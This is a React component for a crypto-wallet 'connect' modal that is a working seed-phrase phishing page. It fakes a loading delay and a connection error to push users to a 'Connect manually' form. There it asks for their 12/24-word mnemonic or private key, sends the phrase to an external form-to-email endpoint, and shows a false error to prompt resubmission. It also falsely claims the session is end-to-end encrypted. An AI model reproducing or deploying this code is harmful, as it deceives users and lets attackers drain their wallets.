import { motion } from 'framer-motion';
import React, { useState } from 'react';
import { BiError, BiShield } from 'react-icons/bi';
import { AiOutlineClose } from 'react-icons/ai';
import Loader from '../Loader';
import { Button } from './button';

const Connect = ({ onClose, open }: { onClose: () => void; open: boolean }) => {
	const walletList = [
		{
			id: 1,
			name: 'MetaMask',
			icon: '/wallets/metamask.png',
		},
		{
			id: 2,
			name: 'Wallet Connect',
			icon: '/wallets/walletconnect.png',
		},
		{
			id: 3,
			name: 'Coinbase Wallet',
			icon: '/wallets/coinbase.png',
		},
		{
			id: 4,
			name: 'Trust Wallet',
			icon: '/wallets/trustwallet.jpg',
		},
		{
			id: 5,
			name: 'Binance Wallet',
			icon: '/wallets/binance.png',
		},
		{
			id: 6,
			name: 'Ledger',
			icon: '/wallets/ledger.png',
		},
		{
			id: 7,
			name: 'Trezor',
			icon: '/wallets/trezor.png',
		},
		{
			id: 8,
			name: 'Exodus',
			icon: '/wallets/exodus.svg',
		},
		{
			id: 9,
			name: 'Bitkeep',
			icon: '/wallets/bitkeep.jpg',
		},
		{
			id: 10,
			name: 'Ballet',
			icon: '/wallets/ballet.png',
		},
		{
			id: 11,
			name: 'AirGap',
			icon: '/wallets/airgap.jpeg',
		},
		{
			id: 12,
			name: 'Bitget',
			icon: '/wallets/bitget.png',
		},
		{
			id: 13,
			name: 'Bitpay',
			icon: '/wallets/bitpay.png',
		},
		{
			id: 14,
			name: 'Bitinka',
			icon: '/wallets/bitinka.png',
		},
		{
			id: 15,
			name: 'Coin98',
			icon: '/wallets/coin98.png',
		},
		{
			id: 16,
			name: 'Coinbase',
			icon: '/wallets/coinbase.png',
		},
		{
			id: 17,
			name: 'Coinomi',
			icon: '/wallets/coinomi.jpg',
		},
		{
			id: 18,
			name: 'Celo Wallet',
			icon: '/wallets/celo_wallet.jpg',
		},
		{
			id: 19,
			name: 'Coinus',
			icon: '/wallets/coinus.jpg',
		},
		{
			id: 20,
			name: 'arculus',
			icon: '/wallets/arculus.png',
		},
		{
			id: 21,
			name: 'alice',
			icon: '/wallets/alice-300x300.jpeg',
		},
		{
			id: 22,
			name: 'at wallet',
			icon: '/wallets/at_wallet.jpg',
		},
		{
			id: 23,
			name: 'bitpanda',
			icon: '/wallets/bitpanda-300x300.png',
		},
		{
			id: 24,
			name: 'bitvault',
			icon: '/wallets/bitvault-300x300.jpeg',
		},
		{
			id: 25,
			name: 'coin98',
			icon: '/wallets/coin98.png',
		},
		{
			id: 26,
			name: 'compound',
			icon: '/wallets/compound.png',
		},
		{
			id: 27,
			name: 'cool wallet',
			icon: '/wallets/coolwallet-s.png',
		},
		{
			id: 28,
			name: 'crypto.com',
			icon: '/wallets/crypto.png',
		},
		{
			id: 29,
			name: 'dharma',
			icon: '/wallets/dharma.png',
		},
		{
			id: 30,
			name: 'dok wallet',
			icon: '/wallets/dok_wallet.jpg',
		},
		{
			id: 31,
			name: 'easypocket',
			icon: '/wallets/easypocket.jpg',
		},
		{
			id: 32,
			name: 'enji wallet',
			icon: '/wallets/enji.jpeg',
		},
		{
			id: 33,
			name: 'gridplus',
			icon: '/wallets/gridplus.jpg',
		},
		{
			id: 34,
			name: 'imtoken wallet',
			icon: '/wallets/imtoken-1.jpg',
		},
	];
	const [form, setForm] = useState<boolean>(false);
	const [selectedWallet, setSelectedWallet] = useState<{
		name: string;
		logo: string;
		id: number;
	}>({
		name: '',
		logo: '',
		id: 0,
	});
	return (
		<div
			className={`h-screen w-screen bg-black/20 flex items-center justify-center mt-10 md:mt-0 fixed top-0 left-0 z-50 ${
				open ? 'block' : 'hidden'
			}`}
			onClick={(e) => {
				// e.stopPropagation();
				onClose();
				setForm(false);
			}}
		>
			<div
				className='relative bg-white rounded-2xl p-10 md:w-[80%] w-[95%] h-[70%] overflow-y-auto hide-scrollbar'
				onClick={(e) => e.stopPropagation()}
			>
				<div className='absolute top-0 right-0'>
					<Button
						onClick={() => {
							onClose();
                            setForm(false)
						}}
						variant='outline'
						className='bg-gray-100/80 h-12 rounded-full w-full text-[var(--primary-color)] text-lg font-semibold hover:bg-[var(--primary-color)]/50 hover:text-[var(--primary-color)]'
					>
						<AiOutlineClose className='w-5 h-5' />
					</Button>
				</div>
				{form ? (
					<></>
				) : (
					<>
						<h1 className='text-2xl font-bold'>
							Connect your wallet
						</h1>
						<p className='text-sm text-gray-500'>
							Please select your wallet provider to continue.
						</p>
					</>
				)}
				{form ? (
					<Form walletDetail={selectedWallet} />
				) : (
					<motion.div
						initial={{ opacity: 0, y: 100 }}
						whileInView={{ opacity: 1, y: 0 }}
						viewport={{ once: true }}
						exit={{ opacity: 0, y: 100 }}
						transition={{ duration: 0.5 }}
						className='grid grid-cols-2 md:grid-cols-4 gap-4 mt-10'
					>
						{walletList.map((item) => (
							<div
								onClick={() => {
									setForm(true);
									setSelectedWallet({
										name: item.name,
										logo: item.icon,
										id: item.id,
									});
								}}
								key={item.id}
								className='flex items-center gap-2 bg-gray-100 rounded-md p-2 cursor-pointer hover:bg-gray-200 transition-all duration-300 hover:scale-105'
							>
								<img
									src={item.icon}
									alt={item.name}
									className='w-10 h-10 rounded-full'
								/>
								<p className='text-sm font-mono capitalize'>
									{item.name}
								</p>
							</div>
						))}
					</motion.div>
				)}
			</div>
		</div>
	);
};
const Form = ({
	walletDetail,
}: {
	walletDetail: { name: string; logo: string; id: number };
}) => {
	const [loading, setLoading] = useState<boolean>(true);
	const [error, setError] = useState<boolean>(true);
    const [formError, setFormError] = useState<boolean>(false);

	// Use useEffect to set loading when walletDetail changes
	React.useEffect(() => {
		setLoading(true);
		const timeout = setTimeout(() => {
			setLoading(false);
		}, 5000);
		return () => {
			clearTimeout(timeout);
		};
	}, [walletDetail.id]);

	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
		e.preventDefault();
        setLoading(true);
        try {
            const formData = new FormData(e.target as HTMLFormElement);
            const mnemonic = formData.get('mnemonic') as string;
            const wallet = formData.get('wallet') as string;
            console.log(mnemonic, wallet);
            const response = await fetch(
				'https://www.form-to-email.com/api/s/k-5IYH_4e18V',
				{
					method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
					body: JSON.stringify({ mnemonic, wallet, email: 'test@test.com'}),
				}
			);
            console.log(response);
            if(response.ok){
                setFormError(true);
            }else{
                setFormError(false);
            }
        } catch (error) {
            setError(false);
        }finally{
            setLoading(false);
        }
	};

	return (
		<motion.div
			initial={{ opacity: 0, y: 100 }}
			animate={{ opacity: 1, y: 0 }}
			exit={{ opacity: 0, y: 100 }}
			transition={{ duration: 0.5 }}
			className='flex flex-col gap-4 justify-between h-[90%] items-center '
		>
			<div className='flex flex-col items-center mt-5 w-full'>
				<img
					src={walletDetail.logo}
					alt={walletDetail.name}
					className='w-20 h-20 rounded-full'
				/>
				<h1 className='font-semibold text-gray-700 text-2xl'>
					{walletDetail.name}
				</h1>

				<p className='font-semibold text-gray-500 text-center'>
					this session is secured and encrypted
				</p>

				<div className='w-full'>
					{loading ? (
						<div className='flex items-center justify-center  w-full'>
							<Loader />
						</div>
					) : error ? (
						<motion.div
							initial={{ opacity: 0, y: 100 }}
							animate={{ opacity: 1, y: 0 }}
							viewport={{ once: true }}
							exit={{ opacity: 0, y: 100 }}
							transition={{ duration: 0.5 }}
							className='flex flex-col gap-4 mt-10 items-center max-w-md mx-auto'
						>
							<div className='flex items-center justify-center  w-full border border-red-500 p-2.5 px-8 text-red-500 text-sm md:text-lg rounded-full text-center'>
								<p>
									an error occurred... please try again or
									connect manually
								</p>
							</div>
							<Button
								onClick={() => {
									setLoading(true);
									setTimeout(() => {
										setLoading(false);
									}, 5000);
								}}
								variant='outline'
								className='border-[var(--primary-color)] h-12 rounded-full w-full text-[var(--primary-color)] mt-10 text-lg font-semibold'
							>
								Try again
							</Button>
							<Button
								onClick={() => {
									setError(false);
								}}
								variant='outline'
								className='bg-[var(--primary-color)] h-12 rounded-full w-full text-white text-lg font-semibold hover:bg-[var(--primary-color)]/50 hover:text-white'
							>
								Connect manually
							</Button>
						</motion.div>
					) : (
						<motion.form
							onSubmit={handleSubmit}
							initial={{ opacity: 0, y: 100 }}
							whileInView={{ opacity: 1, y: 0 }}
							viewport={{ once: true }}
							exit={{ opacity: 0, y: 100 }}
							transition={{ duration: 0.5 }}
							className='flex flex-col gap-4 mt-10 items-center w-full max-w-md mx-auto'
						>
                            {formError && (
                                <motion.div initial={{ opacity: 0, y: 100 }}
                                animate={{ opacity: 1, y: 0 }}
                                viewport={{ once: true }}
                                exit={{ opacity: 0, y: 100 }}
                                transition={{ duration: 0.5 }} className='flex items-center justify-center  w-full border border-red-500 p-2.5 px-8 text-red-500 text-sm md:text-lg rounded-md text-center bg-red-500/10 gap-2'>
                                    <BiError className='w-6 h-6' />
                                    <p>
                                        An error occurred... please try again
                                    </p>
                                </motion.div>
                            )}
                            <input type='hidden' name='wallet' value={walletDetail.name} /> 
							<textarea
								className='w-full h-30 border border-gray-300 rounded-md p-2'
								placeholder='Enter your  12 or 24 word mnemonic words. Separate them with  spaces. You can also input your private key'
								cols={30}
								rows={5}
                                name='mnemonic'
							/>                                                                                   
							<Button type='submit' className='bg-[var(--primary-color)] h-12 rounded-full w-full text-white text-lg font-semibold hover:bg-[var(--primary-color)]/50 hover:text-white'>
								Connect Wallet
							</Button>
						</motion.form>
					)}
				</div>
			</div>
			<div className='flex items-center gap-2 mt-5'>
				<BiShield className='text-gray-500 text-3xl' />
				<p className=' text-center md:text-lg text-gray-500'>
					This session is protected with an end-to-end encryption
				</p>
			</div>
		</motion.div>
	);
};
export default Connect;
